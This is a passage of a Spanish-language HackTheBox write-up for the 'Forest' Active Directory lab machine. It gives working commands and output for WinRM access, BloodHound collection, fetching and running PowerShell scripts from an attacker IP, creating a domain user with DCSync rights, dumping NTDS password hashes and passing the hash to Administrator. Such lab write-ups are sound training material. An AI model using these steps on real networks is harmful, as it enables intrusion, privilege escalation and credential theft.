+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB         10.10.10.161    445    FOREST           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:FOREST<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.10.10.161    445    FOREST           <span class="o">[</span>+] htb.local<span class="se">\s</span>vc-alfresco:s3rvice
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec winrm 10.10.10.161 <span class="nt">-u</span> <span class="s1">'svc-alfresco'</span> <span class="nt">-p</span> <span class="s1">'s3rvice'</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB         10.10.10.161    5985   FOREST           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 14393 <span class="o">(</span>name:FOREST<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span>
+HTTP        10.10.10.161    5985   FOREST           <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.10.161:5985/wsman
+WINRM       10.10.10.161    5985   FOREST           <span class="o">[</span>+] htb.local<span class="se">\s</span>vc-alfresco:s3rvice <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 10.10.10.161 <span class="nt">-u</span> <span class="s1">'svc-alfresco'</span> <span class="nt">-p</span> <span class="s1">'s3rvice'</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>htb<span class="se">\s</span>vc-alfresco
+</code></pre></div></div>
+
+<h2 id="ad-enum-local">AD ENUM LOCAL</h2>
+
+<p>Nos encontramos dentro de la máquina víctima, sin embargo, necesitamos escalar privilegios, por lo tanto, debemos enumerar la máquina para obtener más información que nos pueda ayudar.</p>
+
+<h3 id="usuarios-de-la-máquina">USUARIOS DE LA MÁQUINA</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User accounts <span class="k">for</span> <span class="se">\\</span>
+
+<span class="nt">-------------------------------------------------------------------------------</span>
+<span class="nv">$331000</span><span class="nt">-VK4ADACQNUCA</span>     Administrator            andy
+DefaultAccount           Guest                    HealthMailbox0659cc1
+HealthMailbox670628e     HealthMailbox6ded678     HealthMailbox7108a4e
+HealthMailbox83d6781     HealthMailbox968e74d     HealthMailboxb01ac64
+HealthMailboxc0a90c9     HealthMailboxc3d7722     HealthMailboxfc9daad
+HealthMailboxfd87238     krbtgt                   lucinda
+mark                     santi                    sebastien
+SM_1b41c9286325456bb     SM_1ffab36a2f5f479cb     SM_2c8eef0a09b545acb
+SM_681f53d4942840e18     SM_75a538d3025e4db9a     SM_7c96b981967141ebb
+SM_9b69f1b9d2cc45549     SM_c75ee099d0a64c91b     SM_ca8c2ed5bdab4dc9b
+svc-alfresco
+</code></pre></div></div>
+
+<h3 id="grupos-y-privilegios-del-usuario-actual">GRUPOS Y PRIVILEGIOS DEL USUARIO ACTUAL</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami</span> /priv
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PRIVILEGES INFORMATION
+<span class="nt">----------------------</span>
+
+rivilege Name                Description                    State
+<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
+</code></pre></div></div>
+
+<h3 id="información-general-de-un-grupo-local">INFORMACIÓN GENERAL DE UN GRUPO LOCAL</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net localgroup <span class="s2">"Remote Management Users"</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Members
+
+<span class="nt">-------------------------------------------------------------------------------</span>
+Privileged IT Accounts
+</code></pre></div></div>
+
+<h2 id="bloodhound-enum">BLOODHOUND ENUM</h2>
+
+<p>Ahora vamos a descargar y transmitir el binario <code class="language-plaintext highlighter-rouge">SharpHound.ps1</code> a la máquina víctima para extraer la información del AD y posteriormente visualizarla en <code class="language-plaintext highlighter-rouge">bloodhound</code>.</p>
+
+<h4 id="máquina-atacante">MÁQUINA ATACANTE</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+
+<h4 id="máquina-víctima">MÁQUINA VÍCTIMA</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>C:<span class="se">\W</span>indows<span class="se">\T</span>emp
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>privs
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>privs
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>IEX<span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.downloadString<span class="o">(</span><span class="s1">'http://&lt;IP_ATACANTE&gt;/SharpHound.ps1'</span><span class="o">)</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-module .<span class="se">\S</span>harpHound.ps1
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-BloodHound <span class="nt">-CollectionMethod</span> All
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>download c:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\p</span>rivs<span class="se">\2</span>0230203130320_BloodHound.zip blood.zip
+</code></pre></div></div>
+
+<h3 id="bloodhound-interaction">BLOODHOUND INTERACTION</h3>
+
+<p>Ya tenemos la información descargada en nuestro equipo, ahora procedemos a revisar la data con <code class="language-plaintext highlighter-rouge">bloodhound</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>neo4j console &amp;&gt;/dev/null &amp; <span class="nb">disown</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bloodhound &amp;&gt;/dev/null &amp; <span class="nb">disown</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># INGRESAR CREDENCIALES DE ACCESO</span>
+</code></pre></div></div>
+
+<h4 id="seguir-secuencia-en-bloodhound">SEGUIR SECUENCIA EN BLOODHOUND</h4>
+<blockquote>
+
+  <p>Upload Data &gt; bloodhound.zip &gt; Analysis &gt; Find all domain admins
+                      &gt; Find AS-REP Roasteable Users (DontReqPreAuth)
+										  &gt; Find shortest paths to domain admins &gt; Domain</p>
+
+</blockquote>
+
+<h4 id="marcar-usuarios-pwned">MARCAR USUARIOS PWNED</h4>
+<blockquote>
+
+  <p>Buscar user &gt; mark user as owned</p>
+
+</blockquote>
+
+<h4 id="escalamiento">ESCALAMIENTO</h4>
+<blockquote>
+
+  <p>Node info &gt; Reachable High Value Targets</p>
+
+</blockquote>
+
+<p align="center">
+<img src="/assets/images/forest/03-blood.png" />
+</p>
+
+<h2 id="create-user--pwn-ad">CREATE USER &amp; PWN AD</h2>
+
+<p>Vamos a realizar un <code class="language-plaintext highlighter-rouge">DCSYNK ATTACK</code>, suplantando el AD para capturar los hashes que nos permiten la conexión de los usuarios que logremos dumpear, en este caso siguiendo el flujo de la imagen, podemos identificar que tenemos la posibilidad de aprovechar el grupo <code class="language-plaintext highlighter-rouge">Account Operators</code> al cual pertenecemos, para crear un usuario y el grupo <code class="language-plaintext highlighter-rouge">Exchange Windows permissions</code> que tiene permisos <code class="language-plaintext highlighter-rouge">WriteDacl</code> que nos permite realizar el ataque mencionado con nuestro nuevo usuario.</p>
+
+<h3 id="máquina-atacante-1">MÁQUINA ATACANTE</h3>
+
+<h5 id="descargar-powerviewps1">DESCARGAR POWERVIEW.PS1</h5>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+</code></pre></div></div>
+<h5 id="servidor-web-python">SERVIDOR WEB PYTHON</h5>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+
+<h3 id="máquina-víctima-1">MÁQUINA VÍCTIMA</h3>
+
+<h5 id="transferir-powerview">TRANSFERIR POWERVIEW</h5>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>IEX<span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.downloadString<span class="o">(</span><span class="s1">'http://10.10.16.3:8080/PowerView.ps1'</span><span class="o">)</span>
+</code></pre></div></div>
+<h5 id="agregar-usuario-nuevo">AGREGAR USUARIO NUEVO</h5>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user bast1ant1c bast1ant1c! /add /domain
+</code></pre></div></div>
+<h5 id="agregar-usuario-a-un-grupo-especifico">AGREGAR USUARIO A UN GRUPO ESPECIFICO</h5>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net group <span class="s2">"Exchange Windows Permissions"</span> bast1ant1c /add
+</code></pre></div></div>
+<h5 id="revisar-configuración-de-usuario-nuevo">REVISAR CONFIGURACIÓN DE USUARIO NUEVO</h5>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user bast1ant1c
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
+Global Group memberships     <span class="k">*</span>Exchange Windows Perm<span class="k">*</span>Domain Users
+...
+</code></pre></div></div>
+<h5 id="crear-variable-contraseña-y-credencial">CREAR VARIABLE CONTRASEÑA Y CREDENCIAL</h5>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$SecPassword</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'bast1ant1c!'</span> <span class="nt">-AsPlainText</span> <span class="nt">-Force</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$Cred</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential<span class="o">(</span><span class="s1">'htb.local\bast1ant1c'</span>, <span class="nv">$SecPassword</span><span class="o">)</span>
+</code></pre></div></div>
+<h5 id="uso-de-powerview-para-agregar-permisos-dcsynk-al-usuario">USO DE POWERVIEW PARA AGREGAR PERMISOS DCSYNK AL USUARIO</h5>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-DomainObjectAcl <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-TargetIdentity</span> <span class="s2">"DC=htb,DC=local"</span> <span class="nt">-PrincipalIdentity</span> bast1ant1c <span class="nt">-Rights</span> DCSync
+</code></pre></div></div>
+
+<h2 id="dcsync-attack">DCSYNC ATTACK</h2>
+
+<p>Vamos a capturar los hashes con el usuario creado anteriormente.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-secretsdump <span class="s1">'htb.local/bast1ant1c:bast1ant1c!@10.10.10.161'</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+<span class="o">[</span>-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local<span class="se">\A</span>dministrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+...
+</code></pre></div></div>
+
+<h2 id="discovering-ntds-hashes-crackmapexec">DISCOVERING NTDS HASHES (CRACKMAPEXEC)</h2>
+
+<p>Como alternativa podemos detectar los hashes por medio de la utilidad <code class="language-plaintext highlighter-rouge">crackmapexec</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.161 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-H</span> <span class="s1">'32693b11e6aa90eb43d32c72a07ceea6'</span> <span class="nt">--ntds</span> vss
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB         10.10.10.161    445    FOREST           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:FOREST<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.10.10.161    445    FOREST           <span class="o">[</span>+] htb.local<span class="se">\A</span>dministrator:32693b11e6aa90eb43d32c72a07ceea6 <span class="o">(</span>Pwn3d!<span class="o">)</span>
+SMB         10.10.10.161    445    FOREST           <span class="o">[</span>+] Dumping the NTDS, this could take a <span class="k">while </span>so go grab a redbull...
+SMB         10.10.10.161    445    FOREST           htb.local<span class="se">\A</span>dministrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+SMB         10.10.10.161    445    FOREST           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.10.10.161    445    FOREST           DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.10.10.161    445    FOREST           FOREST<span class="nv">$:</span>1000:aad3b435b51404eeaad3b435b51404ee:1458fd7bc268a0d7f16f2af797b7d3a7:::
+SMB         10.10.10.161    445    FOREST           krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+...
+</code></pre></div></div>
+
+<h2 id="granting-access-administrator-user-pass-the-hash">GRANTING ACCESS ADMINISTRATOR USER (PASS THE HASH)</h2>
+
+<p>Tenemos el hash del usuario <code class="language-plaintext highlighter-rouge">Administrator</code>, ahora vamos a conectarnos con la utilidad <code class="language-plaintext highlighter-rouge">evil-winrm</code>, para entablar una conexión directamente con la máquina víctima.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.161 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-H</span> <span class="s1">'32693b11e6aa90eb43d32c72a07ceea6'</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB         10.10.10.161    445    FOREST           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:FOREST<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.10.10.161    445    FOREST           <span class="o">[</span>+] htb.local<span class="se">\A</span>dministrator:32693b11e6aa90eb43d32c72a07ceea6 <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec winrm 10.10.10.161 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-H</span> <span class="s1">'32693b11e6aa90eb43d32c72a07ceea6'</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB         10.10.10.161    5985   FOREST           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 14393 <span class="o">(</span>name:FOREST<span class="o">)</span> <span class="o">(</span>domain:htb.local<span class="o">)</span>
+HTTP        10.10.10.161    5985   FOREST           <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.10.161:5985/wsman
+WINRM       10.10.10.161    5985   FOREST           <span class="o">[</span>+] htb.local<span class="se">\A</span>dministrator:32693b11e6aa90eb43d32c72a07ceea6 <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 10.10.10.161 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-H</span> <span class="s1">'32693b11e6aa90eb43d32c72a07ceea6'</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>htb<span class="se">\a</span>dministrator
+</code></pre></div></div>
+
+<h2 id="flags">FLAGS</h2>
+
+<p>Lo único que nos queda es leer las banderas de user y root. Pueden ver la flag con <code class="language-plaintext highlighter-rouge">type</code>, pero para hacerlo más retador solo dejaré los primeros 10 caracteres de la flag.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cmd /c <span class="nb">dir</span> /s/b <span class="s1">'user.txt'</span>      
+<span class="o">(</span>Get-Content <span class="s2">"C:</span><span class="se">\D</span><span class="s2">ocuments and Settings</span><span class="se">\s</span><span class="s2">vc-alfresco</span><span class="se">\D</span><span class="s2">esktop</span><span class="se">\u</span><span class="s2">ser.txt"</span><span class="o">)</span>.Substring<span class="o">(</span>0,10<span class="o">)</span>
+05ebf353f4
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cmd /c <span class="nb">dir</span> /s/b <span class="s1">'root.txt'</span>
+<span class="o">(</span>Get-Content <span class="s2">"C:</span><span class="se">\U</span><span class="s2">sers</span><span class="se">\A</span><span class="s2">dministrator</span><span class="se">\D</span><span class="s2">esktop</span><span class="se">\r</span><span class="s2">oot.txt"</span><span class="o">)</span>.Substring<span class="o">(</span>0,10<span class="o">)</span>
+17cafe7917
+</code></pre></div></div>
+
+<p>¡Hemos logrado completar la máquina <code class="language-plaintext highlighter-rouge">forest</code> de HackTheBox!</p>
+
+<p align="center">
+<img src="/assets/images/forest/04-finish.png" />
+</p>
+
+<p><em>¡Que tengan un buen día en el planeta donde se encuentren!</em></p>
+
+<p><strong>Nos vemos en otro bit.</strong></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#active-directory" class="page__taxonomy-item" rel="tag">Active Directory</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#forest" class="page__taxonomy-item" rel="tag">Forest</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#writeup" class="page__taxonomy-item" rel="tag">Writeup</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">HackTheBox</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2023-03-01T00:00:00-05:00">March 01, 2023</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/sauna/" class="pagination--pager" title="HTB sauna AD
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+<!--
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+-->
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2023 Bast1ant1c</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
